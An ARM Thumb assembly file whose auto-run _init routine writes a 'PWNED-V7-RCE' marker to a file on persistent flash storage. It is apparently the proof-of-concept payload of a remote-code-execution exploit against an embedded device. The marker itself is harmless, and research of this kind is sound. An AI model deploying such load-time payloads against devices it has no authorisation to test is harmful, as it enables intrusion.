    .syntax unified
    .thumb
    .text
    .global _init
    .type _init, %function
_init:
    push {r4, lr}
    @ open("/tmp/jiritsu/zzz_rce_proof.txt", O_WRONLY|O_CREAT|O_TRUNC, 0644)
    @ 注意: 走 nflasha6 挂载点 → 持久化, 拔电池后仍在
    movs r7, #5
    adr  r0, p_proof
    movw r1, #0x241
    movw r2, #0x1a4
    svc  #0
    mov  r4, r0
    cmp  r4, #0
    blt  done
    @ write(fd, "PWNED-V7-RCE\n", 13)
    movs r7, #4
    mov  r0, r4
    adr  r1, msg
    movs r2, #13
    svc  #0
    @ close(fd)
    movs r7, #6
    mov  r0, r4
    svc  #0
done:
    pop  {r4, pc}
    .align 2
p_proof:
    .ascii "/tmp/jiritsu/zzz_rce_proof.txt\0"
    .balign 4
msg:
    .ascii "PWNED-V7-RCE\n"
    .balign 4
